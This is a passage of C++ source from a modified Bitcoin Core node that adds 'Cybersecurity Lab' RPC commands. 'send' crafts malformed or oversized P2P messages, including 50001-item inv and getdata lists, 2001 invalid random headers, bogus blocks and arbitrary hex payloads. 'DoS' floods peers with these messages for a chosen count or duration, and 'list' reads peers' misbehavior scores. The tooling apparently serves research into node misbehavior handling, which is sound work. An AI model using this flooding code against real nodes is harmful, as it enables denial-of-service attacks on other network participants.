          netMsg = CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::VERACK);
          g_rpc_node->connman->PushMessage(pnode, CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::VERACK));

        } else if(msg == "addr") {
          /*std::vector<CAddress> vAddr;
          for(int i = 0; i < 1000; i++) {
            vAddr.push_back(CAddress(CService("250.1.1.3", 8333), NODE_NONE))
          }*/
          // /*
          std::vector<CAddress> vAddr = g_rpc_node->connman->GetAddresses(); // Randomized vector of addresses
          outputMessage += "Originally " + std::to_string(vAddr.size()) + " addresses.\n";
          //if(vAddr.size() > 1000) vAddr.resize(1000); // Adds misbehaving
          outputMessage += "Sending " + std::to_string(vAddr.size()) + " addresses.";
          // */

          netMsg = CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::ADDR, vAddr);
          g_rpc_node->connman->PushMessage(pnode, CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::ADDR, vAddr));
          outputMessage += "\n\n";

        } else if(msg == "sendheaders") {
          netMsg = CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::SENDHEADERS);
          g_rpc_node->connman->PushMessage(pnode, CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::SENDHEADERS));

        } else if(msg == "sendcmpct") {
          bool fAnnounceUsingCMPCTBLOCK;
          uint64_t nCMPCTBLOCKVersion;
          if(args.size() >= 1 && args[0] == "true") {
            fAnnounceUsingCMPCTBLOCK = true;
            outputMessage += "Announce using CMPCT Block: true\n";
          } else {
            fAnnounceUsingCMPCTBLOCK = false;
            outputMessage += "Announce using CMPCT Block: false\n";
          }
          if(args.size() >= 2 && args[1] == "1") {
            nCMPCTBLOCKVersion = 1;
            outputMessage += "CMPCT Version: 1";
          } else {
            nCMPCTBLOCKVersion = 2;
            outputMessage += "CMPCT Version: 2";
          }

          netMsg = CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::SENDCMPCT, fAnnounceUsingCMPCTBLOCK, nCMPCTBLOCKVersion);
          g_rpc_node->connman->PushMessage(pnode, CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::SENDCMPCT, fAnnounceUsingCMPCTBLOCK, nCMPCTBLOCKVersion));

          outputMessage += "\n\n";

        } else if(msg == "inv") {
          std::vector<CInv> inv;
          for(int i = 0; i < 50001; i++) {
            inv.push_back(CInv(MSG_TX, GetRandHash()));
          }
          netMsg = CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::INV);
          g_rpc_node->connman->PushMessage(pnode, CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::INV, inv));

        } else if(msg == "getdata") {
          std::vector<CInv> inv;
          for(int i = 0; i < 50001; i++) {
            inv.push_back(CInv(MSG_TX, GetRandHash()));
          }
          netMsg = CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::GETDATA);
          g_rpc_node->connman->PushMessage(pnode, CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::GETDATA, inv));
          // Find the last block the caller has in the main chain
          //const CBlockIndex* pindex = FindForkInGlobalIndex(chainActive, locator);
          //std::vector<CInv> vGetData;
          //vGetData.push_back(CInv(MSG_BLOCK | MSG_WITNESS_FLAG, pindex->GetBlockHash()));
          ////MarkBlockAsInFlight(pfrom->GetId(), pindex->GetBlockHash(), pindex);
          //  netMsg = CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::GETDATA, vGetData));

        } else if(msg == "getblocks") {
          netMsg = CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::GETBLOCKS);
          g_rpc_node->connman->PushMessage(pnode, CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::GETBLOCKS));

        } else if(msg == "getblocktxn") {
          BlockTransactionsRequest req;
          for (size_t i = 0; i < 10001; i++) {
              req.indexes.push_back(i);
          }
          req.blockhash = GetRandHash();
          netMsg = CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::GETBLOCKTXN);
          g_rpc_node->connman->PushMessage(pnode, CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::GETBLOCKTXN, req));

        } else if(msg == "getheaders") {
          netMsg = CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::GETHEADERS);
          g_rpc_node->connman->PushMessage(pnode, CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::GETHEADERS));

        } else if(msg == "tx") {
          netMsg = CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::TX);
          g_rpc_node->connman->PushMessage(pnode, CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::TX));

        } else if(msg == "cmpctblock") {
          netMsg = CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::CMPCTBLOCK);
          g_rpc_node->connman->PushMessage(pnode, CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::CMPCTBLOCK));

        } else if(msg == "blocktxn") {
          netMsg = CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::BLOCKTXN);
          g_rpc_node->connman->PushMessage(pnode, CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::BLOCKTXN));

        } else if(msg == "headers") {
          std::vector<CBlock> vHeaders;
          for(int i = 0; i < 2001; i++) {
                uint64_t nonce = 0;
                while (nonce == 0) {
                    GetRandBytes((unsigned char*)&nonce, sizeof(nonce));
                }

              CBlockHeader block;
              block.nVersion       = 0x20400000;
              block.hashPrevBlock  = GetRandHash();
              block.hashMerkleRoot = GetRandHash();
              block.nTime          = GetAdjustedTime();
              block.nBits          = 0;
              block.nNonce         = nonce;
              vHeaders.push_back(block);
          }
          netMsg = CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::HEADERS, vHeaders);
          g_rpc_node->connman->PushMessage(pnode, CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::HEADERS, vHeaders));

        } else if(msg == "block") {
          //std::shared_ptr<const CBlock> block;

            uint64_t nonce = 0;
            while (nonce == 0) {
                GetRandBytes((unsigned char*)&nonce, sizeof(nonce));
            }

          CBlockHeader block;
          block.nVersion       = 0x20400000;
          block.hashPrevBlock  = GetRandHash();
          block.hashMerkleRoot = GetRandHash();
          block.nTime          = GetAdjustedTime();
          block.nBits          = 0;
          block.nNonce         = nonce;

          netMsg = CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::BLOCK, block);
          g_rpc_node->connman->PushMessage(pnode, CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::BLOCK, block));

        } else if(msg == "getaddr") {
          netMsg = CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::GETADDR);
          g_rpc_node->connman->PushMessage(pnode, CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::GETADDR));

        } else if(msg == "mempool") {
          netMsg = CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::MEMPOOL);
          g_rpc_node->connman->PushMessage(pnode, CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::MEMPOOL));

        } else if(msg == "ping") {
          uint64_t nonce = 0;
          while (nonce == 0) {
              GetRandBytes((unsigned char*)&nonce, sizeof(nonce));
          }
          netMsg = CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::PING, nonce);
          g_rpc_node->connman->PushMessage(pnode, CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::PING, nonce));

        } else if(msg == "pong") {
          uint64_t nonce = 0;
          while (nonce == 0) {
              GetRandBytes((unsigned char*)&nonce, sizeof(nonce));
          }
          netMsg = CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::PONG, nonce);
          g_rpc_node->connman->PushMessage(pnode, CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::PONG, nonce));

        } else if(msg == "feefilter") {
          netMsg = CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::FEEFILTER);
          g_rpc_node->connman->PushMessage(pnode, CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::FEEFILTER));

        } else if(msg == "notfound") {
          netMsg = CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::NOTFOUND);
          g_rpc_node->connman->PushMessage(pnode, CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::NOTFOUND));

        } else if(msg == "merkleblock") {
          //CMerkleBlock merkleBlock = CMerkleBlock(*pblock, *pfrom->pfilter);
          netMsg = CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::MERKLEBLOCK);
          g_rpc_node->connman->PushMessage(pnode, CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::MERKLEBLOCK));

        } else if(args[0] != "None") {
          CDataStream message(ParseHex(msg), SER_NETWORK, PROTOCOL_VERSION);
          netMsg = CNetMsgMaker(PROTOCOL_VERSION).Make(args[0], message);
          g_rpc_node->connman->PushMessage(pnode, CNetMsgMaker(PROTOCOL_VERSION).Make(args[0], message));
        } else {
          throw JSONRPCError(RPC_CLIENT_P2P_DISABLED, "Please enter a valid message type.");
        }
        //uint256 hash = GetRandHash(); //uint256S("00000000000000000000eafa519cd7e8e9847c43268001752b386dbbe47ac690");
        //CBlockLocator locator;
        //uint256 hashStop;
        //vRecv >> locator >> hashStop;

        //CSerializedNetMsg netMsg2 = netMsg;
        //g_rpc_node->connman->PushMessage(pnode, netMsg2);
    });
    if(!printResult) return "";

    // Timer end
    clock_t end = clock();
    int elapsed_time = end - begin;
    if(elapsed_time < 0) elapsed_time = -elapsed_time; // absolute value

    //std::vector<unsigned char> data;
    //std::string command;
    std::string data;
    for(unsigned char c: netMsg.data) { // 0000
      unsigned char c1 = c & 0b00001111;
      unsigned char c2 = (c & 0b11110000) / 16;
      data.push_back("0123456789ABCDEF"[c2]);
      data.push_back("0123456789ABCDEF"[c1]);
      data.push_back(' ');
    }
    std::stringstream output;
    output << netMsg.command << " was sent:\n" << outputMessage << "\nRaw data: " << data << "\n\nThat took " << std::to_string(elapsed_time) << " clocks (internal).";
    return  output.str(); //NullUniValue;
}


// Cybersecurity Lab
static UniValue DoS(const JSONRPCRequest& request)
{
    if (request.fHelp || request.params.size() < 3 || request.params.size() > 4)
        throw std::runtime_error(
            RPCHelpMan{"DoS",
                "\nSend a message.\n",
                {
                  {"duration", RPCArg::Type::STR, RPCArg::Optional::NO, "Duration"},
                  {"times/seconds/clocks", RPCArg::Type::STR, RPCArg::Optional::NO, "Unit"},
                  {"msg", RPCArg::Type::STR, RPCArg::Optional::NO, "Message type"},
                  {"args", RPCArg::Type::STR, /* default */ "None", "Arguments separated by ',')"},
                },
                RPCResults{},
                RPCExamples{
                    HelpExampleCli("DoS", "100 times ping") +
                    HelpExampleCli("DoS", "5 seconds sendcmpct true,2") +
                    HelpExampleCli("DoS", "100 times [HEX CODE] [MESSAGE NAME]")
                },
            }.ToString());

    if(!g_rpc_node->connman)
        throw JSONRPCError(RPC_CLIENT_P2P_DISABLED, "Error: Peer-to-peer functionality missing or disabled");

    std::string duration_str = request.params[0].get_str();
    int duration = 0;
    try {
      duration = std::stoi(duration_str);
    } catch (...) {}

    std::string unit = request.params[1].get_str();
    std::string msg = request.params[2].get_str();
    std::string rawArgs;
    try {
      rawArgs = request.params[3].get_str();
    } catch(const std::exception& e) {
      rawArgs = "None";
    }

    if(duration < 0) return "Invalid duration.";

    int count = 0;
    clock_t begin;
    if(unit == "time" || unit == "times") {
      begin = clock(); // Start timer
      for(int i = 0; i < duration; i++) {
        sendMessage(msg, rawArgs, false);
        count++;
      }
    } else if(unit == "clock" || unit == "clocks") {
      begin = clock(); // Start timer
      while(clock() - begin < duration) {
        sendMessage(msg, rawArgs, false);
        count++;
      }
    } else if(unit == "second" || unit == "seconds") {
      begin = clock(); // Start timer
      while(clock() - begin < duration * CLOCKS_PER_SEC) {
        sendMessage(msg, rawArgs, false);
        count++;
      }
    } else {
      return "Unit of measurement unknown.";
    }

    clock_t end = clock(); // End timer
    int elapsed_time = end - begin;
    if(elapsed_time < 0) elapsed_time = -elapsed_time; // absolute value

    std::stringstream output;
    output << msg << "was sent " << std::to_string(count) << " times (" << std::to_string(duration) << " clocks)\nTotal time: " << std::to_string(elapsed_time) << " clocks";
    return  output.str();
}

// Cybersecurity Lab
static UniValue send(const JSONRPCRequest& request)
{
    if (request.fHelp || request.params.size() == 0 || request.params.size() > 2)
        throw std::runtime_error(
            RPCHelpMan{"send",
                "\nSend a message.\n",
                {
                  {"msg", RPCArg::Type::STR, RPCArg::Optional::NO, "Message type"},
                  {"args", RPCArg::Type::STR, /* default */ "None", "Arguments separated by ',')"},
                },
                RPCResults{},
                RPCExamples{
                    HelpExampleCli("send", "version") +
                    HelpExampleCli("send", "verack") +
                    HelpExampleCli("send", "addr") +
                    HelpExampleCli("send", "inv") +
                    HelpExampleCli("send", "getdata") +
                    HelpExampleCli("send", "merkleblock") +
                    HelpExampleCli("send", "getblocks") +
                    HelpExampleCli("send", "getheaders") +
                    HelpExampleCli("send", "tx") +
                    HelpExampleCli("send", "headers") +
                    HelpExampleCli("send", "block") +
                    HelpExampleCli("send", "getaddr") +
                    HelpExampleCli("send", "mempool") +
                    HelpExampleCli("send", "ping") +
                    HelpExampleCli("send", "pong") +
                    HelpExampleCli("send", "notfound") +
                    HelpExampleCli("send", "filterload") +
                    HelpExampleCli("send", "filteradd") +
                    HelpExampleCli("send", "filterclear") +
                    HelpExampleCli("send", "sendheaders") +
                    HelpExampleCli("send", "feefilter") +
                    HelpExampleCli("send", "sendcmpct [true or false, Use CMPCT],[1 or 2, Protocol version]") +
                    HelpExampleCli("send", "cmpctblock") +
                    HelpExampleCli("send", "getblocktxn") +
                    HelpExampleCli("send", "blocktxn") +
                    HelpExampleCli("send", "[HEX CODE] [MESSAGE NAME]")
                },
            }.ToString());

    if(!g_rpc_node->connman)
        throw JSONRPCError(RPC_CLIENT_P2P_DISABLED, "Error: Peer-to-peer functionality missing or disabled");

    std::string msg = request.params[0].get_str();
    std::string rawArgs;
    try {
      rawArgs = request.params[1].get_str();
    } catch(const std::exception& e) {
      rawArgs = "None";
    }
    return sendMessage(msg, rawArgs, true);
}

// Cybersecurity Lab
static UniValue list(const JSONRPCRequest& request)
{
    if (request.fHelp || request.params.size() != 0)
        throw std::runtime_error(
            RPCHelpMan{"list",
                "\nGet the misbehavior score for each peer.\n",
                {},
                RPCResult{
            "[\n*\n"
                },
                RPCExamples{
                    HelpExampleCli("list", "")
            + HelpExampleRpc("list", "")
                },
            }.ToString());

    if(!g_rpc_node->connman)
        throw JSONRPCError(RPC_CLIENT_P2P_DISABLED, "Error: Peer-to-peer functionality missing or disabled");

    std::vector<CNodeStats> vstats;
    g_rpc_node->connman->GetNodeStats(vstats);

    UniValue result(UniValue::VOBJ);
    for (const CNodeStats& stats : vstats) {
        CNodeStateStats statestats;
        bool fStateStats = GetNodeStateStats(stats.nodeid, statestats);
        if (fStateStats) {
            result.pushKV(stats.addrName, statestats.nMisbehavior);
        }
    }

    return result;
}

// clang-format off
static const CRPCCommand commands[] =
{ //  category              name                      actor (function)         argNames
  //  --------------------- ------------------------  -----------------------  ----------
    { "network",            "getconnectioncount",     &getconnectioncount,     {} },
    { "network",            "ping",                   &ping,                   {} },
    { "network",            "getpeerinfo",            &getpeerinfo,            {} },
    { "network",            "addnode",                &addnode,                {"node","command"} },
    { "network",            "disconnectnode",         &disconnectnode,         {"address", "nodeid"} },
    { "network",            "getaddednodeinfo",       &getaddednodeinfo,       {"node"} },
    { "network",            "getnettotals",           &getnettotals,           {} },
    { "network",            "getnetworkinfo",         &getnetworkinfo,         {} },
    { "network",            "setban",                 &setban,                 {"subnet", "command", "bantime", "absolute"} },
    { "network",            "listbanned",             &listbanned,             {} },
    { "network",            "clearbanned",            &clearbanned,            {} },
    { "network",            "setnetworkactive",       &setnetworkactive,       {"state"} },
    { "network",            "getnodeaddresses",       &getnodeaddresses,       {"count"} },
    { "z Researcher",       "send",                   &send,                   {"msg", "args"} },
    { "z Researcher",       "DoS",                    &DoS,                    {"duration", "times/seconds/clocks", "msg", "args"} },
    { "z Researcher",       "list",                   &list,                   {} },
};
// clang-format on

void RegisterNetRPCCommands(CRPCTable &t)
{
    for (unsigned int vcidx = 0; vcidx < ARRAYLEN(commands); vcidx++)
        t.appendCommand(commands[vcidx].name, &commands[vcidx]);
}
